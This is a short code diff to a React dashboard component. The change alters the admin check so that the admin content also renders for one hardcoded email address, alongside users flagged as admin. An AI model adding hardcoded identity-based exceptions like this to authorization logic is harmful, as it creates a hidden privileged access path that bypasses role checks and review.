@@ -100,7 +100,7 @@ function DashBoard(props) {
 
   return (
     (userInfo &&
-      userInfo.isAdmin) &&
+      (userInfo.isAdmin || userInfo.email === 'dm@beirutgrouptt.com')) &&
     <div className="content">
       <form className="form-control">
         <ul className="form-control-container">
